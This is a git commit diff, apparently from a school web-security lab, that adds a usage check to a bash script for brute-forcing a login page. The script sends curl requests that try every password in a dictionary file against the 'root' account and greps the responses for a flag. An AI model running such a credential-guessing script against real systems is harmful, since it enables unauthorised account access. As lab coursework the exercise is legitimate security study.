4e29ded8e9174cb250506b70e64ec53fa19abc51
42aroger <aroger@student.42.fr>
2019-11-14 11:32:50 +0100

    add usage

--- 02_BruteForce/Ressources/bruteforce.sh
+++ 02_BruteForce/Ressources/bruteforce.sh
@@ -1,7 +1,12 @@
 #/bin/bash
+if [ -z "$1" ]
+then
+	echo 'Usage : ./bruteforce.sh ip'
+	exit 0
+fi
 for line in `cat dictionnary`
 do
 	echo $line
-	curl 'http://10.11.200.162:80/?page=signin&username=root&password='$line'&Login=Login#' >> trash
+	curl 'http://'$1'/?page=signin&username=root&password='$line'&Login=Login#' >> trash
 	cat trash | grep flag
 done
